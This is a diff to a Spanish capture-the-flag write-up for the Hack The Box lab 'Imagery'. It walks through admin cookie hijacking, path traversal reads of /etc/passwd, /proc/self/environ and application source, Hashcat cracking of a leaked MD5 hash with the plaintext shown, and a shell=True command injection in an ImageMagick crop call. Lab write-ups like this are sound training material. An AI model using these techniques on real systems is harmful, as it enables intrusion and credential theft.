@@ -23,7 +23,7 @@ Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotar
 
 Iniciamos con una fase de reconocimiento activo utilizando nmap para identificar la superficie de ataque. El objetivo es descubrir servicios en ejecución y versiones específicas que puedan presentar debilidades.
 
-### 1.1 Escaneo de todos los puertos (Full Port Scan)
+## 1.1 Escaneo de todos los puertos (Full Port Scan)
 Ejecutamos un escaneo inicial sobre el rango completo de puertos TCP (1-65535) para asegurar que no pasamos por alto ningún servicio oculto en puertos no estándar.
 ```
 nmap -p- -vvv --min-rate 5000 10.129.242.164
@@ -43,7 +43,7 @@ PORT      STATE  SERVICE          REASON
 22/tcp    open   ssh              syn-ack
 8000/tcp  open   http-alt         syn-ack ttl 63
 ```
-### 1.2 Detección de Servicios y Versiones
+## 1.2 Detección de Servicios y Versiones
 Una vez identificados los puertos abiertos, realizamos un escaneo más profundo utilizando los flags -sC (scripts por defecto) y -sV (detección de versiones).
 
 ```
@@ -61,7 +61,7 @@ PORT     STATE SERVICE  VERSION
 |_http-server-header: Werkzeug/3.1.3 Python/3.12.7
 ```
 
-### 1.3 Configuración del Virtual Host
+## 1.3 Configuración del Virtual Host
 
 Dado que el servidor web puede estar configurado para responder a un nombre de dominio específico, es necesario mapear la dirección IP de la instancia al nombre de dominio imagery.htb. Esto permite que el navegador (o herramientas como curl) envíe el encabezado HTTP Host correcto.
 
@@ -128,79 +128,62 @@ Al no tener la flag `HttpOnly` incluida en el encabezado `HTTP Set-Cookie` deja 
 Con esta cookie, procedemos a suplantar la identidad del administrador en el navegador para acceder a funciones restringidas. 
 
 ### 2.1.1 Secuestro de sesion
-
-Procedemos a ir al strogange del browser donde encontraremos el valor de la cookie de sesion de nuentro ususario, si remplazamos la cookie nuestra por el del administrador accederemos a su usuario y podemos ver sus funciones
+Con la cookie de sesión del administrador en nuestro poder, procedemos a realizar un **Session Hijacking**. Para ello, interceptamos la sesión actual en el navegador (vía DevTools > Storage) y sustituimos el valor de nuestra cookie `session` por el token capturado.
 
 ![](/assets/images/htb-writeup-imagery/secuestroSesion.png)
 
-Al navegar como administradores podemos ver que tiene accesos a eliminar usuarios, descargar logs, ver y eliminar los reportes de errores. 
+Tras refrescar la página, el servidor nos reconoce como el usuario `admin@imagery.htb`. Al explorar el panel administrativo, identificamos nuevas funcionalidades críticas:
 
-Veamos una de las fetchs que envia el navegador:
+- Gestión de usuarios (Eliminación).
+- Visualización y borrado de reportes de errores.
+- **Lectura de logs del sistema**.
+
+Al analizar la petición encargada de obtener los registros del sistema, observamos un parámetro interesante:
 
 ```js
 await fetch("http://imagery.htb:8000/admin/get_system_log?log_identifier=admin%40imagery.htb.log", {
-    "credentials": "include",
-    "headers": {
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Upgrade-Insecure-Requests": "1",
-    },
-    "method": "GET",
-    "mode": "cors"
+    // ... headers ...
+    "method": "GET"
 });
+
 ```
 ## 2.2 Local File Inclusion (LFI)
-Analicemos el **Path** `/get_system_log` este recurso accedido puede ser un file o un folder. Pero al ser una app web desarrollada con flask podemos intuir que es un metodo. Y su **Query scrign** envia el parametro `?log_identifier=admin%40imagery.htb.log` que podemos ver que es el nombre del log que intenta recuperar de la base de datos. 
+Al analizar  el **Path** `/admin/get_system_log` y su **Query scrign** `?log_identifier=admin%40imagery.htb.log` notamos que el parámetro recibe el nombre de un log. En aplicaciones basadas en **Flask**, este comportamiento suele indicar que el backend utiliza una función de lectura de archivos para servir el contenido dinámicamente.
 
-En conlusion por medio de este metodo descarga un archivo. ¿Facil no?
+Si el servidor no sanitiza correctamente esta entrada (por ejemplo, mediante el uso de `os.path.join` sin validar secuencias de escape), estaríamos ante una vulnerabilidad de **Local File Inclusion (LFI)** o **Arbitrary File Read**.
 
-Haremos **Web Fuzzing** al parametro `log_identifier` y veremos como se comporta la APP. Para eso podemos usar ZAP, Burpsuite, FFUF, Gobuster, entre otros. 
+Para confirmarlo, realizamos una fase de **Web Fuzzing** sobre el parámetro `log_identifier`. El objetivo es identificar si la aplicación permite el salto de directorios utilizando caracteres especiales (`../`).
 
 ### 2.2.1 Web Fuzzing con Burp Suite
-Usaremos Burb includer que es el web fuzzer de Burp. 
-
-Configurado con: 
-- **sniper attack** 
-- **payload type**: Simple list 
-- **wordlist**: [SecList/Fuzzing/LFI/LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
+Para validar el alcance del LFI, utilizamos el módulo **Intruder** de Burp Suite configurado en modo Sniper. Empleamos la wordlist [SecList/Fuzzing/LFI/LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), la cual contiene una amplia variedad de secuencias de salto de directorio y archivos conocidos de Linux.
 
 Encontramos que podemos descargar y ver los directorios estandares del sistema.
 
-- `/etc`: El directorio de archivos de configuración del sistema local. Donde tambien se encontran los archivos de configuración para las aplicaciones instaladas.
-  - /etc/passwd 
-  - /etc/hosts
-  - /etc/crontab
-  - /etc/grup
+- `/etc`: Confirmamos el Path Traversal al recuperar con éxito `/etc/grup`. Este archivo nos reveló la existencia de un usuario de sistema `web:x:1001:` (UID 1001), sugiriendo que la aplicación no corre bajo el contexto de `root`, sino de un usuario dedicado llamado **web**.
+  - `/etc/passwd` 
+  - `/etc/hosts`
+  - `/etc/crontab`
+  - `/etc/grup`
 
   ![](/assets/images/htb-writeup-imagery/lfi-etc.png)
 
-- `/proc`: Es un archivo "virtual" que solo existe en la memoria mientras el sistema corre. Donde muestra las variables de entorno del proceso que se está ejecutando actualmente.
-  - /proc/self/environ
+- `/proc`: Es un archivo "virtual" que solo existe en la memoria mientras el sistema corre. Donde muestra las variables de entorno del proceso que se está ejecutando actualmente `HOME=/home/web` (el servidor de flask). 
+  - `/proc/self/environ`
 
   ![](/assets/images/htb-writeup-imagery/lfi-proc.png)
 
-Notamos que exite un grupo llamado `web:x:1001:` y una variable de entorno llamada `HOME=/home/web`.
 
 ### 2.2.2 Codigo fuente
 
-La estructura de un proyecto en **Flask** puede variar desde un único archivo hasta una arquitectura modular compleja, dependiendo de la escala de la aplicación. Una basica constata de la siguiente:
+Tras confirmar la ruta del usuario en las variables de entorno, procedemos a exfiltrar el archivo principal de la aplicación. En un entorno Flask, el archivo `app.py` suele actuar como el orquestador de la lógica del servidor.
 
-```
-mi_proyecto/
-├── app.py              # Lógica principal, rutas y configuración
-├── static/             # Archivos CSS, JS e imágenes
-│   └── css/style.css
-├── templates/          # Archivos HTML (Jinja2)
-│   └── index.html
-├── venv/               # Entorno virtual (muy recomendado)
-└── requirements.txt    # Dependencias del proyecto
-```
-
-Procedemos a descargar por medio del path `/admin/get_system_log?log_identifier=/home/web/web/app.py` el codigo fuente principal de la APP Web y los archivos que la componen.
+Utilizamos `curl` para descargar el código, autenticándonos con la cookie de administrador secuestrada:
 
 ```
 curl -s -O -b 'session={admin_cookie}'  http://imagery.htb:8000/admin/get_system_log?log_identifier=/home/web/web/app.py
 ```
+
+Se confirma que `SESSION_COOKIE_HTTPONLY` está explícitamente en False, lo que permitió nuestro ataque inicial de XSS
 
 ```py
 from flask import Flask, render_template
@@ -222,7 +205,8 @@ app_core.secret_key = os.urandom(24).hex()
 app_core.config['SESSION_COOKIE_HTTPONLY'] = False
 ```
 
-Vemos los modulos y librerias que se importan:
+La aplicación importa módulos específicos para cada función. Basándonos en nuestra hoja de ruta inicial:
+
 - config.py
 - utils.py
 - api_auth.py
@@ -232,7 +216,7 @@ Vemos los modulos y librerias que se importan:
 - api_admin.py
 - api_misc.py
 
-Vemos en el config.py algunas variables de configuracion.
+Continuamos extrayendo archivos críticos definidos en los imports y en `config.py`:
 
 ```py
 import os
@@ -243,7 +227,7 @@ UPLOAD_FOLDER = 'uploads'
 SYSTEM_LOG_FOLDER = 'system_logs'
 ```
 
-Vemos en el db.json las hashes de los usuarios: 
+`config.py` define `DATA_STORE_PATH = 'db.json'`. Al descargar este archivo, obtenemos los hashes de las contraseñas de los usuarios. Aunque ya tenemos acceso como administrador, vemos el hash del usuario **testuser@imagery.htb** podría ser util para persistencia o movimiento lateral (pudiendo ser crackeados con *John the Ripper* o *Hashcat*).
 
 ```json
 {
@@ -271,7 +255,8 @@ Vemos en el db.json las hashes de los usuarios:
     ]
 }
 ```
-## 2.3 Remote Code Execution
+
+## 2.3 Remote Code Execution( RCE)
 
 Analicemos el metodo `apply_visual_transform()` de  `api_edit.py`
 
@@ -356,14 +341,14 @@ def apply_visual_transform():
 
 ```
 
-Notamos que este metodo tiene algunas validaciones de permisos y una de ellas es que solo esta dispobible para el usuario con la flag `isTestuser` que se encuentra marcada en la estructura json en el archivo `db.json` ¿lo recuerdan? y la relacion con el atributo `is_testuser_account` de la session se encuentra mapeada en el archivo `admin.py`. 
+Tras analizar el código fuente exfiltrado de `api_edit.py`, identificamos una vulnerabilidad crítica en el endpoint `/apply_visual_transform`. Aunque la función está restringida a usuarios con el atributo `is_testuser_account` (el cual confirmamos que posee el usuario **testuser@imagery.htb** en db.json), un administrador puede interactuar con ella si la lógica de sesión lo permite o si se suplanta a dicho usuario.
 
 Como vemos en el codigo fuente, este metodo tiene varias acciones para transformar una imagen: 
-- Recortar
-- Girar / Rotar
-- Saturacion
-- Brillo
-- Constraste
+- `crop`: Recortar
+- `rotate`: Girar / Rotar
+- `saturation`: Saturacion
+- `brightness`: Brillo
+- `contrast`: Constraste
 
 Analicemos la accion de recortar en el condicional.
 
@@ -376,11 +361,14 @@ if transform_type == 'crop':
     command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
     subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
 ```
-El desarrollador en este punto utiliza **ImageMagick** que es una suite de linea de comandos para procesar imagenes, donde basicamente mediante datos de entrada del usuario pasara la intruccion a **ImageMagick** para recortar la imagen.
 
-Al usar `shell=True`, Python no ejecuta el programa directamente. En su lugar abre una instancia de la terminal le envia la cadena de texto referenciada en la variable `command` y la terminal ejecuta el comando.
+El desarrollador en este punto utiliza **ImageMagick** que es una suite de linea de comandos para procesar imagenes. Las variables `x`, `y`, `width` y `height` provienen directamente del input del usuario (`request.get_json()`) sin ningún tipo de saneamiento o validación numérica.
 
-Si logramos romper la cadena haciendo que la concatenacion referenciada en la variable `command` solo tome el valor de uno de los parametros que envia el usuario, podemos inyectar un comando del sistema operativo y hacernos con el servidor web via `rever shell``. 
+Al ejecutar `subprocess.run` con el argumento `shell=True`, Python invoca `/bin/sh` para interpretar la cadena command. Esto permite el uso de metacaracteres de shell (como `;`, `&&`, `|`) para encadenar comandos arbitrarios.
+
+Para explotar esto, necesitamos que el parámetro `x` rompa la sintaxis del comando original, haciendo que la concatenacion referenciada en la variable `command` solo tome el valor de `x` para poder inyectar un comando del sistema operativo y hacernos con el servidor web via `rever shell`.
+
+Mientras que las otras funciones (`rotate`, `saturation`, etc.) utilizan una lista de argumentos en `subprocess.run` (lo cual es seguro), la función `crop` usa una `f-string` vulnerable.
 
 Ejemplo: mini PoC
 ```py
@@ -405,12 +393,18 @@ subprocess.run(command, shell=True)
 ```
 En este script de python vemos que es posible romper la cadena y usar `x` como inyector.
 
-### 2.3.1 Crackear hash
+### 2.3.1  Rompimiento de Hashes (Cracking)
 
-Obtendremos las credenciales del usuario **testuser@imagery.htb** crakeando el hash con **hashcat**
+Para explotar la inyección de comandos, la aplicación requiere que la sesión activa tenga el atributo `is_testuser_account` habilitado. Este flag se activa al autenticarse como el usuario **testuser@imagery.htb**.
+
+Utilizamos los hashes MD5 obtenidos previamente del archivo `db.json` y procedemos a realizar un ataque de diccionario utilizando **Hashcat** y la wordlist `rockyou.txt`:
 
 ```
-hashcat "2c65c8d7bfbca32a3ed42596192384f6" -m 0 -a 0 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --show
+hashcat "2c65c8d7bfbca32a3ed42596192384f6" -m 0 -a 0 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
 
 2c65c8d7bfbca32a3ed42596192384f6:iambatman
-``````
+```
+
+- **Password**: iambatman
+
+Con estas credenciales, cerramos la sesión de administrador e iniciamos sesión como **testuser**. Ahora, el servidor permitirá que nuestras peticiones al endpoint `/apply_visual_transform` procesen las transformaciones de imagen, desbloqueando nuestro vector de **RCE**.
